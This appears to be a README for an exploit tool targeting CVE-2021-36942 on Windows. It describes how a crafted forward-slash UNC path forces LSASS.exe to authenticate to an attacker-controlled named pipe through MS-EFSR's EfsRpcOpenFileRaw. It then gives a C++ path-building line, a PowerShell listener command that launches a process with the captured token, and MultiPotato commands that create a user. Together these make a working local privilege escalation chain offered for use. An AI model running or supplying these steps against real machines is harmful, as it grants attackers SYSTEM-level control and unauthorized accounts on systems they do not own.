# Efsr-Client (CVE-2021-36942) 

Local privilege escalation method which forces LSASS.exe process to perform NTLM authentication using the MS-EFSR's EfsRpcOpenFileRaw method.
* By default LSASS.exe takes the UNC host device name and makes a `CreateFile` operation to the `\\<host>\pipe\srvsvc` UNC path.
* This is exploited by supplying a UNC host device of with forwarded slashes (`\\127.0.0.1/pipe/packet`).  
* The default `CreateFile` operation is changed from  `\\127.0.0.1\pipe\srvsvc` to `\\127.0.0.1\pipe\packet\pipe\srvsvc`. 

The `/pipe/packet` can be modified to change the pipe location.  
```c++
StringCchPrintf(pwszFilePath, MAX_PATH, L"\\\\127.0.0.1/pipe/AABB\\pipe\\srvsvc");
```

Invoke-PrintSpooferNet.ps1 can be used as a listener (Works, but crashes process). 
```ps1
ImportModule Invoke-PrintSpooferNet.ps1
Invoke-PrintSpooferNet -Pipe '\\.\pipe\AABB\pipe\srvsvc' -Command 'calc.exe' -Method 'CreateProcessWithTokenW'
```

[MultiPotato](https://github.com/S3cur3Th1sSh1t/MultiPotato)

```cmd
MultiPotato.exe -t CreateUser -p AABB\pipe\srvsvc
EfsrClient.exe
```
